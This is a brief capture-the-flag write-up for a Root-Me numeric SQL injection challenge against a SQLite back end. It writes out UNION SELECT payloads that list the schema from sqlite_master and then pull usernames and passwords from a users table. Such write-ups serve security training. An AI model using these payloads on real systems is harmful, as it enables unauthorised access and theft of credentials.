# SQL injection: numeric

[root-me challenge: SQL-injection-Numeric](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Numeric): Retrieve the administrator password.

----

```text
news_id=1' UNION SELECT NULL --
```

```text
SQLite3::query()
```

Using [PayloadAllTheThings: SQLiteInjection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md):

```text
news_id=1 UNION SELECT NULL,sql,NULL FROM sqlite_master --
```

```text
news_id=1 UNION SELECT NULL,username,password FROM users --
```
